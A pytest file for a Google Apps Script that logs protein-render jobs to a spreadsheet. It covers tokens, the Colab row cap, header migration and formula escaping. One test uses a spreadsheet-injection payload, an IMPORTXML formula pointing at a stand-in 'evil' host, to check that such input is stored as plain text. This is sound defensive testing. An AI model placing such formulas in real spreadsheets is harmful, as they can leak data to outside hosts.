"""google-sheet/Code.gs, run in Node.js with stand-ins for Google's services."""

import json
import shutil
import subprocess
from pathlib import Path

import pytest

from app import sheet
from app.jobs import Job, Submitter
from app.options import RenderRequest

ROOT = Path(__file__).resolve().parent.parent
NODE = shutil.which("node")
pytestmark = pytest.mark.skipif(NODE is None, reason="Node.js is not installed")

TOKEN, COLAB = "site-secret", "colab-public"


def run(posts, existing=None, get=False):
    payload = {
        "code": str(ROOT / "google-sheet" / "Code.gs"),
        "token": TOKEN,
        "colab_token": COLAB,
        "existing": existing or [],
        "posts": posts,
        "get": get,
    }
    proc = subprocess.run(
        [NODE, str(ROOT / "tests" / "apps_script_harness.js")],
        input=json.dumps(payload), capture_output=True, text=True, check=True,
    )
    return json.loads(proc.stdout)


def a_row(name="Ada Lovelace", source=None):
    req = RenderRequest(pdb_id="4hhb")
    job = Job(req, req.cache_key(), "c", status="done", started_at=1.0, finished_at=22.4)
    row = sheet.record_row(job, Submitter(name, "ada@example.org", "https://x.modal.run", 1_700_000_000.25))
    if source:
        row["source"] = source
    return row


def column(name):
    return sheet.ROW_KEYS.index(name)


def test_website_rows_are_written_under_a_header():
    out = run([{"token": TOKEN, "rows": [a_row()]}], get=True)
    assert out["replies"][0] == {"ok": True, "added": 1}
    assert out["replies"][1]["ok"] is True  # doGet: deployment check
    header, row = out["rows"]
    assert header[0] == "Time" and header[-1] == "Source" and len(header) == len(sheet.ROW_KEYS)
    assert row[0] == {"date": 1_700_000_000_250}
    assert row[column("name")] == "Ada Lovelace"
    assert row[column("render_s")] == 21.4  # numbers stay numbers
    assert row[column("source")] == "Web app"
    assert out["bold"]


def test_colab_key_rows_are_always_marked_colab_and_capped():
    pretending = [a_row(name=f"Visitor {i}", source="Web app") for i in range(5)]
    out = run([{"token": COLAB, "rows": pretending}])
    assert out["replies"][0] == {"ok": True, "added": 3}
    data = out["rows"][1:]
    assert len(data) == 3
    assert {r[column("source")] for r in data} == {"Colab"}


def test_wrong_or_missing_keys_are_refused():
    out = run([{"token": "nope", "rows": [a_row()]}, "not json", {"rows": [a_row()]}])
    assert "wrong token" in out["replies"][0]["error"]
    assert "not JSON" in out["replies"][1]["error"]
    assert "wrong token" in out["replies"][2]["error"]
    assert out["rows"] == []


def test_formula_like_text_is_stored_as_plain_text():
    row = a_row(name='=IMPORTXML("http://evil","//a")')
    row["email"] = "+x@y.org"
    data = run([{"token": COLAB, "rows": [row]}])["rows"][1]
    assert data[column("name")] == "'=IMPORTXML(\"http://evil\",\"//a\")"
    assert data[column("email")] == "'+x@y.org"


def test_sheet_from_the_older_script_gets_the_new_header():
    old_header = ["Time", "Name", "Email", "PDB ID", "Style", "Colour", "Material", "View",
                  "Size", "Quality", "Background", "Ligands", "Assembly", "Credit line",
                  "Status", "From cache", "Render time (s)", "Error", "Open again"]
    old_row = ["2026-11-04", "Old visitor"] + [""] * (len(old_header) - 2)
    out = run([{"token": TOKEN, "rows": [a_row()]}], existing=[old_header, old_row])
    header, kept, new = out["rows"]
    assert header[-1] == "Source" and header[:-1] == old_header
    assert kept[1] == "Old visitor"
    assert new[column("source")] == "Web app"
